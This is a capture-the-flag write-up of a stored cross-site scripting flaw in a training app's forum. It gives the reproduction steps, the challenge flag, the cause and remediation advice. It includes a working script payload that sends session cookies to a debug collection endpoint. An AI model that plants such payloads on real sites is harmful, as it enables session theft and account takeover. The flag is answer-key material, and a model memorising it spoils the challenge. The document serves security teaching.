# Stored Cross Site Scripting

## Category

OWASP A03:2021 — Injection
WSTG 4.7 — Stored XSS

## Location

`/forum`

## Discovery

- `<!-- note to self: the "HTML supported" label is not a joke. content goes straight into the DB. don't tell students. — wil -->`
- `<!-- wil: left /api/collect up from when I was debugging the bot — it logs whatever you throw at ?c= and hands it all back on GET. sophie: that is an open exfil log. wil: it's a DEBUG endpoint. -->`

## Steps to Reproduce

1. Navigate to the Forum tab and create a new post.
2. Inject an active script payload into the post content field designed to harvest session identifiers and exfiltrate them to the debug endpoint:
   ```html
   <script>
     fetch('http://localhost:4942/api/collect?c=' + encodeURIComponent(document.cookie));
   </script>
   ```
3. Submit the post and ensure it renders for users (or triggers via an automated review bot).
4. Access `/api/collect` to review the gathered data logs containing harvested JWT session tokens.

## Flag

`FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}`

## Impact

A reader of the forum post can execute attacker-supplied JavaScript; the documented payload can read a JavaScript-accessible session cookie and send it to `/api/collect`.

## Cause

- **Lack of Output Encoding & Auto-Escaping:** User-supplied input is stored raw in the database and rendered directly into the DOM or HTML response without sanitization or context-aware output encoding.
- **Insecure Cookie Design (Missing HttpOnly):** Authentication cookies or tokens are accessible via JavaScript (`document.cookie`), enabling seamless session theft via XSS.
- **Unsecured Debug Artifacts:** Leftover development endpoints (`/api/collect`) act as convenient data exfiltration drop-zones for attackers.

## Remediation

- **Context-Aware Output Encoding:** Enforce strict framework-level auto-escaping (e.g., React JSX safe rendering, template engine escaping) to prevent raw HTML/script injection.
- **Cookie Hardening (`HttpOnly`):** Set the `HttpOnly` attribute on all session cookies to completely block JavaScript access (`document.cookie`), mitigating session hijacking risks even if an XSS vulnerability exists.
- **Content Security Policy (CSP):** Implement a robust CSP header to restrict script execution sources and block unauthorized inline scripts or external resource connections.
- **Code Hygiene & Cleanup:** Remove all debugging, telemetry, or open logging endpoints prior to moving code into production environments.
